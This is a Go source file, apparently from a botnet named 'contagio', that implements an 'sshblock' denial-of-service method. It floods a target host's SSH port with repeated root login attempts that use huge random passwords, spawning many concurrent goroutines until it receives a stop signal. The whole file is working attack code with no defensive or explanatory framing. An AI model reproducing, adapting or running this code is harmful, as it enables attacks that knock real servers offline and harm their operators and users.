package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	rnd "crypto/rand"
	"fmt"
	"math/rand"
	"time"

	s "golang.org/x/crypto/ssh"
)

func SshBlockMethod(ctx context.Context, ipaddr string, port string) {

	defer Catch()

	if config.DEBUG {
		fmt.Println("[sshblock] Attack started")
	}

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[sshblock flood] Attack stopped")
			}
			return
		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[sshblock flood] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			rand.NewSource(time.Now().UnixNano())

			password := genPass("AM~39!~)-43$*(@#&(@h#rh@gyfgy@fgvx*@!39ansbns)", 30000)

			go ssh(ipaddr, port, password)
			go ssh(ipaddr, port, password)
			go ssh(ipaddr, port, password)

			time.Sleep(150 * time.Millisecond)
		}
	}

}

func ssh(target, port, password string) {

	defer Catch()

	for i := 0; i <= 20; i++ {
		go func() {
			conf := &s.ClientConfig{
				User:    "root",
				Timeout: 5 * time.Second,
				Auth: []s.AuthMethod{
					s.Password(password),
				},
				HostKeyCallback: s.InsecureIgnoreHostKey(),
			}
			s.Dial("tcp", target+":"+port, conf)
		}()
		time.Sleep(300 * time.Millisecond)
	}
}

func genPass(ltrs string, length int) string {
	var s = make([]byte, length)
	rnd.Read(s)

	return string(s)
}
